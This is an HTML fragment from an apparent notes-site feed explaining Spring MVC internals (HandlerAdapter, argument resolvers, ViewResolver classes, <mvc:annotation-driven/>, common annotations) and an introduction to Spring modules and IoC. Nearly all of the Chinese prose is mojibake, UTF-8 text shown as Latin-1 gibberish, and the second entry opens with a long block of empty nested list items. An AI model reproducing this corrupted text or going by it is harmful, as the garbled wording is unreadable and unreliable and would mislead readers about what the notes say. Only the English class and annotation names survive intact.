<p>HandlerAdapter æè¿°äº† handler æ˜¯æ€ä¹ˆåŒ¹é…åˆ°åˆé€‚çš„é€‚é…å™¨ï¼Œè¿›è¡Œ handler å¯¹åº”æ–¹æ³•çš„æ‰§è¡Œã€‚å…¶ä»–å‡ ç§é€‚é…å™¨è¿˜å¥½ï¼Œä½†æ˜¯ RequestMappingHandlerAdapter é€‚é…å™¨å¯¹åº”æ¥ä¸‹æ¥çš„å‚æ•°è§£æåŠç»‘å®šå¹¶æ‰§è¡Œå¹¶ä¸æ˜¯é‚£ä¹ˆç®€å•ã€‚</p>

<p>RequestMappingHandlerAdapter å¤§æ¦‚è§£ææµç¨‹å¦‚ä¸‹</p>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-run-RequestMappingHandlerAdapterè§£ææµç¨‹.png" alt="" loading="lazy"></p>
<p><a href="https://www.jianshu.com/p/2bfd65bc9ce4" target="_blank" rel="noopener noreferrer">å‚æ•°è§£æ HandlerAdapter Handler</a></p>
<p><a href="https://www.jianshu.com/p/6eba4e2c6cab" target="_blank" rel="noopener noreferrer">è‡ªå®šä¹‰å‚æ•°è§£æ HandlerAdapter Handler</a></p>
<h4 id="handlermethod" tabindex="-1"> HandlerMethod</h4>
<ul>
<li>HandlerMethod å°è£…æ–¹æ³•å®šä¹‰ç›¸å…³çš„ä¿¡æ¯ (å¦‚ç±»ã€æ–¹æ³•ã€å‚æ•°ç­‰)</li>
<li>InvocableHandlerMethod å‚æ•°å‡†å¤‡å§”æ‰˜ HandlerMethodArgumentResolver è¿›è¡Œå…·ä½“çš„è§£æ</li>
<li>ServletInvocableHandlerMethod æ·»åŠ è¿”å›å€¼å¤„ç†èŒè´£ï¼ŒResponseStatus å¤„ç†</li>
</ul>
<p>åœ¨å®¹å™¨åˆå§‹åŒ–çš„æ—¶å€™ï¼ŒRequestMappingHandlerMapping æ˜ å°„å¤„ç†å™¨å°±å°† @RequestMapping æè¿°çš„æ–¹æ³•ä»¥ RequestMappingInfo ä¸º keyï¼ŒHandlerMethod ä¸º value æ”¾è¿›è‡ªå·±çš„ç¼“å­˜</p>
<h4 id="è§£æå™¨" tabindex="-1"> è§£æå™¨</h4>
<p>å‚æ•°è§£æå™¨(HandlerMethodArgumentResolver)
è¿”å›å€¼çš„è§£æå™¨(HandlerMethodReturnValueHandler)</p>
<p>å‚æ•°è§£æåŠè½¬æ¢çš„è¿‡ç¨‹ï¼Œå…ˆæ˜¯é€šè¿‡å‚æ•°è§£æå™¨è§£æå‚æ•°ï¼Œç„¶åå†æ˜¯è½¬æ¢å™¨è½¬æ¢å‚æ•°ï¼Œæœ€ç»ˆç»‘å®šåˆ°å¯¹åº” RequestMapping æ–¹æ³•å‚æ•°ä¸Šã€‚</p>
<p>æœ‰äº›å¼€å‘åœºæ™¯ä¸­ï¼ŒSpringMVC æä¾›çš„å‚æ•°è§£æå™¨æ»¡è¶³ä¸äº†å’±ä»¬çš„éœ€æ±‚ã€‚ä¾‹å¦‚åœ¨æ•°æ®é‡å¤§çš„æäº¤ç¯å¢ƒä¸­ï¼Œæäº¤æ•°æ®ç”¨åˆ°äº†è¡¨å•å’ŒJSONèåˆçš„æ–¹å¼ï¼Œå°±æ˜¯è¡¨å•æŸä¸ªå­—æ®µçš„ value æ˜¯JSONå­—ç¬¦ä¸²ã€‚
å¦‚æœæ•´ä¸ªæäº¤çš„æ•°æ®ä½“æ˜¯JSONæ•°æ®è¿˜å¥½ï¼Œå¯¼å…¥Jacksonæ¶åŒ…ï¼Œç”¨ @RequestBody ä¿®é¥°å‚æ•°ï¼Œæœ€ç»ˆ SpringMVC ä¼šé€šè¿‡è‡ªå¸¦çš„ RequestResponseBodyMethodProcessor è§£æå™¨è¿›è¡Œè§£æï¼Œä½¿ç”¨ Jackson æä¾›çš„ MappingJackson2HttpMessageConverter è½¬æ¢å™¨å°†JSONæ•°æ®è½¬æ¢æˆæˆ‘ä»¬æƒ³è¦çš„æ ¼å¼ã€‚</p>
<p>å¦‚æœæäº¤çš„æ˜¯æ­£å¸¸è¡¨å•æ•°æ®ä¹Ÿå¥½ï¼Œç”¨ @RequestParam ä¿®é¥°å‚æ•°ï¼Œæœ€ç»ˆ SpringMVC ä¼šé€šè¿‡è‡ªå¸¦çš„ RequestParamMethodArgumentResolver è§£æå™¨è§£æå‡ºè¡¨å•é‡Œé¢çš„ valueï¼Œç„¶åæ‰¾åˆ°åˆé€‚çš„è½¬æ¢å™¨å°†æ•°æ®è£…æ¢æˆæˆ‘ä»¬æƒ³è¦çš„æ ¼å¼ã€‚</p>
<h3 id="è§†å›¾è§£æ-view-viewresolver" tabindex="-1"> è§†å›¾è§£æ View &amp; ViewResolver</h3>
<p><a href="https://www.jianshu.com/p/ec70ae3d1021" target="_blank" rel="noopener noreferrer">è§†å›¾è§£æ View &amp; ViewResolver</a></p>
<h4 id="modelandview" tabindex="-1"> ModelAndView</h4>
<p>SpringMVC å†…éƒ¨æœ€ç»ˆä¼šå°†è¿”å›çš„å‚æ•°åŠè§†å›¾åå­—å°è£…æˆä¸€ä¸ª ModelAndView å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šModel æ˜¯ä¸€ä¸ª HashMap é›†åˆï¼ŒView ä¸€èˆ¬åˆ™æ˜¯ä¸€ä¸ª String ç±»å‹è®°å½•è¦è·³è½¬è§†å›¾çš„åå­—æˆ–è€…æ˜¯è§†å›¾å¯¹è±¡(å¦‚æœæ˜¯è§†å›¾å¯¹è±¡çš„è¯åˆ™ç›´æ¥è·³è¿‡è§†å›¾è§£æå™¨çš„è§£æè¿‡ç¨‹)</p>
<h4 id="è§†å›¾-view" tabindex="-1"> è§†å›¾ View</h4>
<p>è§†å›¾çš„ä½œç”¨æ˜¯æ¸²æŸ“æ¨¡å‹æ•°æ®ï¼Œå°†æ¨¡å‹é‡Œçš„æ•°æ®ä»¥æŸç§å½¢å¼å‘ˆç°ç»™å®¢æˆ·ï¼Œå…¶å®å°±æ˜¯ htmlã€jsp ç”šè‡³ wordã€excel æ–‡ä»¶ï¼›</p>
<table>
<thead>
<tr>
<th>è§†å›¾</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>InternalResourceView</td>
<td>å°† JSP æˆ–å…¶ä»–èµ„æºå°è£…æˆä¸€ä¸ªè§†å›¾ï¼Œä¸€èˆ¬ JSP é¡µé¢ç”¨è¯¥è§†å›¾ç±»</td>
</tr>
<tr>
<td>JstlView</td>
<td>ç»§æ‰¿è‡ªInternalResourceViewï¼Œå¦‚æœ JSP é¡µé¢ä½¿ç”¨äº† JSTL æ ‡ç­¾ï¼Œåˆ™éœ€è¦ä½¿ç”¨è¯¥è§†å›¾ç±»</td>
</tr>
<tr>
<td>AbstractPdfView</td>
<td>PDFè§†å›¾çš„æŠ½è±¡è¶…ç±»</td>
</tr>
<tr>
<td>AbstractXlsView</td>
<td>ä¼ ç»ŸXLSæ ¼å¼çš„Excelæ–‡æ¡£è§†å›¾çš„ä¾¿æ·è¶…ç±»ï¼Œä¸Apache POI 3.5åŠæ›´é«˜ç‰ˆæœ¬å…¼å®¹ã€‚</td>
</tr>
<tr>
<td>AbstractXlsxView</td>
<td>Office 2007 XLSXæ ¼å¼çš„Excelæ–‡æ¡£è§†å›¾çš„ä¾¿æ·è¶…ç±»ï¼Œå…¼å®¹Apache POI 3.5åŠæ›´é«˜ç‰ˆæœ¬ã€‚</td>
</tr>
<tr>
<td>MappingJackson2JsonView</td>
<td>å°†æ¨¡å‹æ•°æ® é€šè¿‡ Jackson å¼€æºæ¡†æ¶çš„ ObjectMapper ä»¥ JSON æ–¹å¼è¾“å‡º</td>
</tr>
</tbody>
</table>
<h4 id="è§†å›¾è§£æå™¨-viewresolver" tabindex="-1"> è§†å›¾è§£æå™¨ ViewResolver</h4>
<p>SpringMVC ä¸ºé€»è¾‘è§†å›¾åçš„è§£ææä¾›äº†ä¸åŒçš„ç­–ç•¥ï¼Œå¯ä»¥åœ¨ Spring Web ä¸Šä¸‹æ–‡ä¸­é…ç½®ä¸€ç§æˆ–å¤šç§è§£æç­–ç•¥ï¼Œå¹¶æŒ‡å®šä»–ä»¬ä¹‹é—´çš„å…ˆåé¡ºåºã€‚</p>
<ul>
<li>æ¯ä¸€ç§æ˜ å°„ç­–ç•¥å¯¹åº”ä¸€ä¸ªå…·ä½“çš„è§†å›¾è§£æå™¨å®ç°ç±»ã€‚</li>
<li>è§†å›¾è§£æå™¨çš„ä½œç”¨æ˜¯å°†é€»è¾‘è§†å›¾è§£æä¸ºä¸€ä¸ªå…·ä½“çš„ç‰©ç†è§†å›¾å¯¹è±¡ã€‚</li>
<li>æ‰€æœ‰çš„è§†å›¾è§£æå™¨éƒ½å¿…é¡»å®ç° ViewResolver æ¥å£ã€‚</li>
<li>å¯ä»¥é€‰æ‹©ä¸€ç§æˆ–å¤šç§è§†å›¾è§£æå™¨ï¼Œå¯ä»¥é€šè¿‡å…¶ order å±æ€§æŒ‡å®šè§£æå™¨çš„ä¼˜å…ˆé¡ºåºï¼Œorder è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
<li>SpringMVC ä¼šæŒ‰ç…§è§†å›¾è§£æå™¨é¡ºåºçš„ä¼˜å…ˆæ¬¡åºè¿›è¡Œè§£æï¼Œç›´åˆ°è¿”å›è§†å›¾å¯¹è±¡ã€‚è‹¥æ— ï¼Œåˆ™æŠ›å‡º ServletException å¼‚å¸¸ã€‚</li>
</ul>
<table>
<thead>
<tr>
<th>è§†å›¾è§£æå™¨</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>AbstractCachingViewResolver</td>
<td>ä¸€ä¸ªæŠ½è±¡è§†å›¾ï¼Œç»§æ‰¿è¯¥ç±»å¯ä»¥è®©è§†å›¾è§£æå™¨å…·æœ‰ç¼“å­˜åŠŸèƒ½</td>
</tr>
<tr>
<td>XmlViewResolver</td>
<td>æ¥å—XMLæ–‡ä»¶çš„è§†å›¾è§£æå™¨ï¼Œé»˜è®¤é…ç½®æ–‡ä»¶åœ¨ /WEB-INF/views.xml</td>
</tr>
<tr>
<td>ResourceBundleViewResolver</td>
<td>ä½¿ç”¨propertiesé…ç½®æ–‡ä»¶çš„è§†å›¾è§£æå™¨ï¼Œé»˜è®¤é…ç½®æ–‡ä»¶æ˜¯ç±»è·¯å¾„ä¸‹çš„views.properties</td>
</tr>
<tr>
<td>UrlBasedViewResolver</td>
<td>ä¸€ä¸ªç®€å•çš„è§†å›¾è§£æå™¨ï¼Œä¸åšä»»ä½•åŒ¹é…ï¼Œéœ€è¦è§†å›¾åå’Œå®é™…è§†å›¾æ–‡ä»¶åç›¸åŒ</td>
</tr>
<tr>
<td>InternalResourceViewResolver</td>
<td>UrlBasedViewResolverçš„ä¸€ä¸ªå­ç±»ï¼Œæ”¯æŒServletå®¹å™¨çš„å†…éƒ¨ç±»å‹ï¼ˆJSPã€Servletã€ä»¥åŠJSTLç­‰ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨setViewClass(..)æŒ‡å®šå…·ä½“çš„è§†å›¾ç±»å‹</td>
</tr>
<tr>
<td>FreeMarkerViewResolver</td>
<td>ä¹Ÿæ˜¯UrlBasedViewResolverçš„å­ç±»ï¼Œç”¨äºFreeMarkerè§†å›¾æŠ€æœ¯</td>
</tr>
<tr>
<td>ContentNegotiatingViewResolver</td>
<td>ç”¨äºè§£æåŸºäºè¯·æ±‚æ–‡ä»¶åæˆ–Accept headerçš„è§†å›¾</td>
</tr>
<tr>
<td>BeanNameViewResolver</td>
<td>å°†é€»è¾‘è§†å›¾åè§£æä¸ºä¸€ä¸ª Beanï¼ŒBean çš„ id ç­‰äºé€»è¾‘è§†å›¾å</td>
</tr>
</tbody>
</table>
<h3 id="æ ‡ç­¾-mvc-annotation-driven" tabindex="-1"> æ ‡ç­¾ <code>&lt;mvc:annotation-driven/&gt;</code></h3>
<p><code>&lt;mvc:annotation-driven/&gt;</code>ï¼Œè¿™ä¸ªæ ‡ç­¾ä¼šå¸®æˆ‘ä»¬æ³¨å…¥å¾ˆå¤šå…³é”®è€Œå®ç”¨çš„beanï¼Œä½†æ˜¯ç”¨å®ƒä¹Ÿå¾—å°å¿ƒè·Ÿè‡ªå·±æ‰‹åŠ¨æ³¨å…¥çš„beané‡å¤ï¼Œä¼šé€ æˆä¸å¿…è¦çš„éº»çƒ¦ã€‚</p>
<p>æ‰€æœ‰çš„è‡ªå®šä¹‰å‘½åç©ºé—´ï¼ˆåƒmvcï¼Œcontextç­‰ï¼‰ä¸‹çš„æ ‡ç­¾è§£æéƒ½æ˜¯ç”±BeanDefinitionParser æ¥å£çš„å®ç°ç±»æ¥å®Œæˆçš„ï¼›<code>&lt;mvc:annotation-driven/&gt;</code>æ ‡ç­¾ï¼Œæ‰¾åˆ°å¯¹åº”çš„å®ç°ç±»æ˜¯org.springframework.web.servlet.config.AnnotationDrivenBeanDefinitionParserã€‚</p>
<p>AnnotationDrivenBeanDefinitionParserï¼Œä¸º <code>&lt;annotation-driven /&gt;</code> MVCåç§°ç©ºé—´å…ƒç´ æä¾›é…ç½®ã€‚</p>
<p>æ³¨å†Œä»¥ä¸‹ <strong>HandlerMappings</strong> (æ˜ å°„å™¨ä»¬)ï¼š</p>
<ul>
<li>RequestMappingHandlerMapping çš„æ’åºä¸º0ï¼Œç”¨äºå°†è¯·æ±‚æ˜ å°„åˆ°å¸¦@RequestMappingæ³¨é‡Šçš„æ§åˆ¶å™¨æ–¹æ³•ã€‚</li>
<li>BeanNameUrlHandlerMapping åœ¨æ’åºä¸º2ï¼Œä»¥å°†URLè·¯å¾„æ˜ å°„åˆ°æ§åˆ¶å™¨beanåç§°ã€‚</li>
</ul>
<p>æ³¨å†Œä»¥ä¸‹ <strong>HandlerAdapters</strong> (é€‚é…å™¨ä»¬)ï¼š</p>
<ul>
<li>RequestMappingHandlerAdapter ç”¨äºä½¿ç”¨å¸¦@RequestMappingæ³¨è§£çš„æ§åˆ¶å™¨æ–¹æ³•å¤„ç†è¯·æ±‚ã€‚</li>
<li>HttpRequestHandlerAdapter ç”¨äºä½¿ç”¨HttpRequestHandlerså¤„ç†è¯·æ±‚ã€‚</li>
<li>SimpleControllerHandlerAdapter ç”¨äºä½¿ç”¨åŸºäºæ¥å£çš„æ§åˆ¶å™¨å¤„ç†è¯·æ±‚ã€‚</li>
</ul>
<p>æ³¨å†Œä»¥ä¸‹ <strong>HandlerExceptionResolvers</strong> (å¼‚å¸¸å¤„ç†è§£æå™¨ä»¬)ï¼š</p>
<ul>
<li>ExceptionHandlerExceptionResolverï¼Œç”¨äºé€šè¿‡ org.springframework.web.bind.annotation.ExceptionHandler æ–¹æ³•å¤„ç†å¼‚å¸¸ã€‚</li>
<li>ResponseStatusExceptionResolver ç”¨äºä½¿ç”¨ org.springframework.web.bind.annotation.ResponseStatus æ³¨é‡Šçš„å¼‚å¸¸ã€‚</li>
<li>DefaultHandlerExceptionResolver ç”¨äºè§£æå·²çŸ¥çš„Springå¼‚å¸¸ç±»å‹</li>
</ul>
<p><strong>å…¶ä»–</strong></p>
<ul>
<li>æ³¨å†Œ org.springframework.util.AntPathMatcher å’Œ org.springframework.web.util.UrlPathHelper ä»¥ä¾› RequestMappingHandlerMappingã€ViewControllers çš„ HandlerMapping å’Œ HandlerMapping æœåŠ¡èµ„æºæ˜¯ä½¿ç”¨ã€‚</li>
</ul>
<h1 id="spring-mvc-æ³¨è§£" tabindex="-1"> Spring MVC æ³¨è§£</h1>
<p>@<strong>EnableWebMvc</strong></p>
<p>åœ¨é…ç½®ç±»ä¸­å¼€å¯Web MVCçš„é…ç½®æ”¯æŒï¼Œå¦‚ä¸€äº›ViewResolveræˆ–è€…MessageConverterç­‰ï¼Œè‹¥æ— æ­¤å¥ï¼Œé‡å†™WebMvcConfigurerAdapteræ–¹æ³•ï¼ˆç”¨äºå¯¹SpringMVCçš„é…ç½®ï¼‰ã€‚</p>
<p>@<strong>Controller</strong></p>
<p>å£°æ˜è¯¥ç±»ä¸ºSpringMVCä¸­çš„Controller</p>
<p>@<strong>RequestMapping</strong></p>
<p>ç”¨äºæ˜ å°„Webè¯·æ±‚ï¼ŒåŒ…æ‹¬è®¿é—®è·¯å¾„å’Œå‚æ•°ï¼ˆç±»æˆ–æ–¹æ³•ä¸Šï¼‰</p>
<p>@<strong>ResponseBody</strong></p>
<p>æ”¯æŒå°†è¿”å›å€¼æ”¾åœ¨responseå†…ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªé¡µé¢ï¼Œé€šå¸¸ç”¨æˆ·è¿”å›jsonæ•°æ®ï¼ˆè¿”å›å€¼æ—æˆ–æ–¹æ³•ä¸Šï¼‰</p>
<p>@<strong>RequestBody</strong></p>
<p>å…è®¸requestçš„å‚æ•°åœ¨requestä½“ä¸­ï¼Œè€Œä¸æ˜¯åœ¨ç›´æ¥è¿æ¥åœ¨åœ°å€åé¢ã€‚ï¼ˆæ”¾åœ¨å‚æ•°å‰ï¼‰</p>
<p>@<strong>RequestParam</strong></p>
<p>å°†è¯·æ±‚çš„å‚æ•°ç»‘å®šåˆ°æ–¹æ³•ä¸­çš„å‚æ•°ä¸Šï¼Œæœ‰requiredå‚æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œrequired=trueï¼Œä¹Ÿå°±æ˜¯è¯¥å‚æ•°å¿…é¡»è¦ä¼ ã€‚</p>
<p>@<strong>PathVariable</strong></p>
<p>ç”¨äºæ¥æ”¶è·¯å¾„å‚æ•°ï¼Œæ¯”å¦‚@RequestMapping(â€œ/hello/{name}â€)ç”³æ˜çš„è·¯å¾„ï¼Œå°†æ³¨è§£æ”¾åœ¨å‚æ•°ä¸­å‰ï¼Œå³å¯è·å–è¯¥å€¼ï¼Œé€šå¸¸ä½œä¸ºRestfulçš„æ¥å£å®ç°æ–¹æ³•ã€‚</p>
<p>@<strong>RestController</strong></p>
<p>è¯¥æ³¨è§£ä¸ºä¸€ä¸ªç»„åˆæ³¨è§£ï¼Œç›¸å½“äº@Controllerå’Œ@ResponseBodyçš„ç»„åˆï¼Œæ³¨è§£åœ¨ç±»ä¸Šï¼Œæ„å‘³ç€ï¼Œè¯¥Controllerçš„æ‰€æœ‰æ–¹æ³•éƒ½é»˜è®¤åŠ ä¸Šäº†@ResponseBodyã€‚</p>
<p>@<strong>ControllerAdvice</strong></p>
<p>é€šè¿‡è¯¥æ³¨è§£ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¯¹äºæ§åˆ¶å™¨çš„å…¨å±€é…ç½®æ”¾ç½®åœ¨åŒä¸€ä¸ªä½ç½®ï¼Œæ³¨è§£äº†@Controllerçš„ç±»çš„æ–¹æ³•å¯ä½¿ç”¨@ExceptionHandlerã€@InitBinderã€@ModelAttributeæ³¨è§£åˆ°æ–¹æ³•ä¸Šï¼Œ
è¿™å¯¹æ‰€æœ‰æ³¨è§£äº† @RequestMappingçš„æ§åˆ¶å™¨å†…çš„æ–¹æ³•æœ‰æ•ˆã€‚</p>
<p>@<strong>ExceptionHandler</strong></p>
<p>ç”¨äºå…¨å±€å¤„ç†æ§åˆ¶å™¨é‡Œçš„å¼‚å¸¸</p>
<p>@<strong>InitBinder</strong></p>
<p>ç”¨æ¥è®¾ç½®WebDataBinderï¼ŒWebDataBinderç”¨æ¥è‡ªåŠ¨ç»‘å®šå‰å°è¯·æ±‚å‚æ•°åˆ°Modelä¸­ã€‚</p>
<p>@<strong>ModelAttribute</strong></p>
<p>æœ¬æ¥çš„ä½œç”¨æ˜¯ç»‘å®šé”®å€¼å¯¹åˆ°Modelé‡Œï¼Œåœ¨@ControllerAdviceä¸­æ˜¯è®©å…¨å±€çš„@RequestMappingéƒ½èƒ½è·å¾—åœ¨æ­¤å¤„è®¾ç½®çš„é”®å€¼å¯¹ã€‚</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Spring ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="spring-ä»‹ç»" tabindex="-1"> Spring ä»‹ç»</h1>
<p>Spring æ¡†æ¶æŒ‡çš„éƒ½æ˜¯ Spring Frameworkï¼Œå®ƒæ˜¯å¾ˆå¤šæ¨¡å—çš„é›†åˆï¼Œä½¿ç”¨è¿™äº›æ¨¡å—å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ååŠ©æˆ‘ä»¬è¿›è¡Œå¼€å‘ã€‚è¿™äº›æ¨¡å—æ˜¯ï¼šæ ¸å¿ƒå®¹å™¨ã€æ•°æ®è®¿é—®/é›†æˆ,ã€Webã€AOPï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼‰ã€å·¥å…·ã€æ¶ˆæ¯å’Œæµ‹è¯•æ¨¡å—ã€‚</p>
<p>Spring å®˜ç½‘åˆ—å‡ºçš„ Spring çš„ 6 ä¸ªç‰¹å¾:</p>
<ul>
<li><strong>æ ¸å¿ƒæŠ€æœ¯</strong> ï¼šä¾èµ–æ³¨å…¥(DI)ï¼ŒAOPï¼Œäº‹ä»¶(events)ï¼Œèµ„æºï¼Œi18nï¼ŒéªŒè¯ï¼Œæ•°æ®ç»‘å®šï¼Œç±»å‹è½¬æ¢ï¼ŒSpELã€‚</li>
<li><strong>æµ‹è¯•</strong> ï¼šæ¨¡æ‹Ÿå¯¹è±¡ï¼ŒTestContextæ¡†æ¶ï¼ŒSpring MVC æµ‹è¯•ï¼ŒWebTestClientã€‚</li>
<li><strong>æ•°æ®è®¿é—®</strong> ï¼šäº‹åŠ¡ï¼ŒDAOæ”¯æŒï¼ŒJDBCï¼ŒORMï¼Œç¼–ç»„XMLã€‚</li>
<li><strong>Webæ”¯æŒ</strong> : Spring MVCå’ŒSpring WebFlux Webæ¡†æ¶ã€‚</li>
<li><strong>é›†æˆ</strong> ï¼šè¿œç¨‹å¤„ç†ï¼ŒJMSï¼ŒJCAï¼ŒJMXï¼Œç”µå­é‚®ä»¶ï¼Œä»»åŠ¡ï¼Œè°ƒåº¦ï¼Œç¼“å­˜ã€‚</li>
<li><strong>è¯­è¨€</strong> ï¼šKotlinï¼ŒGroovyï¼ŒåŠ¨æ€è¯­è¨€ã€‚</li>
</ul>
<h2 id="springæ¨¡å—" tabindex="-1"> Springæ¨¡å—</h2>
<p>ä¸‹å›¾å¯¹åº”çš„æ˜¯ Spring4.x ç‰ˆæœ¬ã€‚ç›®å‰æœ€æ–°çš„5.xç‰ˆæœ¬ä¸­ Web æ¨¡å—çš„ Portlet ç»„ä»¶å·²ç»è¢«åºŸå¼ƒæ‰ï¼ŒåŒæ—¶å¢åŠ äº†ç”¨äºå¼‚æ­¥å“åº”å¼å¤„ç†çš„ WebFlux ç»„ä»¶ã€‚</p>
<p><img src="@source/assets/cs-note/framework/spring/Springä¸»è¦æ¨¡å—.png" alt="Springä¸»è¦æ¨¡å—" loading="lazy"></p>
<ul>
<li><strong>Spring Core</strong>ï¼š åŸºç¡€,å¯ä»¥è¯´ Spring å…¶ä»–æ‰€æœ‰çš„åŠŸèƒ½éƒ½éœ€è¦ä¾èµ–äºè¯¥ç±»åº“ã€‚ä¸»è¦æä¾› IoC ä¾èµ–æ³¨å…¥åŠŸèƒ½ã€‚</li>
<li><strong>Spring Context</strong>: æ„å»ºäºCoreå°è£…åŒ…åŸºç¡€ä¸Šçš„ Contextå°è£…åŒ…ï¼Œæä¾›äº†ä¸€ç§æ¡†æ¶å¼çš„å¯¹è±¡è®¿é—®æ–¹æ³•ï¼Œæœ‰äº›è±¡JNDIæ³¨å†Œå™¨ã€‚Contextå°è£…åŒ…çš„ç‰¹æ€§å¾—è‡ªäºBeanså°è£…åŒ…ï¼Œå¹¶æ·»åŠ äº†å¯¹å›½é™…åŒ–ï¼ˆI18Nï¼‰çš„æ”¯æŒï¼ˆä¾‹å¦‚èµ„æºç»‘å®šï¼‰ï¼Œäº‹ä»¶ä¼ æ’­ï¼Œèµ„æºè£…è½½çš„æ–¹å¼å’ŒContextçš„é€æ˜åˆ›å»ºï¼Œæ¯”å¦‚è¯´é€šè¿‡Servletå®¹å™¨ã€‚</li>
<li><strong>Spring Aspects</strong> ï¼š è¯¥æ¨¡å—ä¸ºä¸AspectJçš„é›†æˆæä¾›æ”¯æŒã€‚</li>
<li><strong>Spring AOP</strong> ï¼šæä¾›äº†é¢å‘åˆ‡é¢çš„ç¼–ç¨‹å®ç°ã€‚</li>
<li><strong>Spring JDBC</strong> : Javaæ•°æ®åº“è¿æ¥ã€‚</li>
<li><strong>Spring JMS</strong> ï¼šJavaæ¶ˆæ¯æœåŠ¡ã€‚</li>
<li><strong>Spring ORM</strong> : ç”¨äºæ”¯æŒHibernateç­‰ORMå·¥å…·ã€‚</li>
<li><strong>Spring DAO</strong>:  DAO (Data Access Object)æä¾›äº†JDBCçš„æŠ½è±¡å±‚ï¼Œå®ƒå¯æ¶ˆé™¤å†—é•¿çš„JDBCç¼–ç å’Œè§£ææ•°æ®åº“å‚å•†ç‰¹æœ‰çš„é”™è¯¯ä»£ç ã€‚ å¹¶ä¸”ï¼ŒJDBCå°è£…åŒ…è¿˜æä¾›äº†ä¸€ç§æ¯”ç¼–ç¨‹æ€§æ›´å¥½çš„å£°æ˜æ€§äº‹åŠ¡ç®¡ç†æ–¹æ³•ï¼Œä¸ä»…ä»…æ˜¯å®ç°äº†ç‰¹å®šæ¥å£ï¼Œè€Œä¸”å¯¹æ‰€æœ‰çš„POJOsï¼ˆplain old Java objectsï¼‰éƒ½é€‚ç”¨ã€‚</li>
<li><strong>Spring Web</strong> : ä¸ºåˆ›å»ºWebåº”ç”¨ç¨‹åºæä¾›æ”¯æŒã€‚</li>
<li><strong>Spring Test</strong> : æä¾›äº†å¯¹ JUnit å’Œ TestNG æµ‹è¯•çš„æ”¯æŒã€‚</li>
</ul>
<h1 id="spring-ioc" tabindex="-1"> Spring IoC</h1>
<p>IoCï¼ˆInverse of Control:æ§åˆ¶åè½¬ï¼‰æ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼Œå°±æ˜¯ å°†åŸæœ¬åœ¨ç¨‹åºä¸­æ‰‹åŠ¨åˆ›å»ºå¯¹è±¡çš„æ§åˆ¶æƒï¼Œäº¤ç”±Springæ¡†æ¶æ¥ç®¡ç†ã€‚ IoC åœ¨å…¶ä»–è¯­è¨€ä¸­ä¹Ÿæœ‰åº”ç”¨ï¼Œå¹¶é Spirng ç‰¹æœ‰ã€‚ IoC å®¹å™¨æ˜¯ Spring ç”¨æ¥å®ç° IoC çš„è½½ä½“ï¼Œ IoC å®¹å™¨å®é™…ä¸Šå°±æ˜¯ä¸ªMapï¼ˆkeyï¼Œvalueï¼‰,Map ä¸­å­˜æ”¾çš„æ˜¯å„ç§å¯¹è±¡ã€‚</p>
<p><strong>IoC å®¹å™¨å°±åƒæ˜¯ä¸€ä¸ªå·¥å‚ä¸€æ ·ï¼Œå½“æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œåªéœ€è¦é…ç½®å¥½é…ç½®æ–‡ä»¶/æ³¨è§£å³å¯ï¼Œå®Œå…¨ä¸ç”¨è€ƒè™‘å¯¹è±¡æ˜¯å¦‚ä½•è¢«åˆ›å»ºå‡ºæ¥çš„ã€‚</strong></p>
<p>IOCæ˜¯æ§åˆ¶åè½¬ï¼Œå®é™…ä¸Šè·å¾—ä¾èµ–å¯¹è±¡çš„è¿‡ç¨‹è¢«åè½¬äº†ï¼Œè·å¾—ä¾èµ–å¯¹è±¡çš„è¿‡ç¨‹ç”±è‡ªèº«ç®¡ç†å˜ä¸ºäº†ç”±IOCå®¹å™¨ä¸»åŠ¨æ³¨å…¥ï¼Œå³â€œ<strong>ä¾èµ–æ³¨å…¥</strong>ï¼ˆDependency Injectionï¼‰â€ã€‚æ‰€è°“ä¾èµ–æ³¨å…¥ï¼Œå°±æ˜¯ç”±IOCå®¹å™¨åœ¨è¿è¡ŒæœŸé—´ï¼ŒåŠ¨æ€åœ°å°†æŸç§ä¾èµ–å…³ç³»æ³¨å…¥åˆ°å¯¹è±¡ä¹‹ä¸­ã€‚</p>
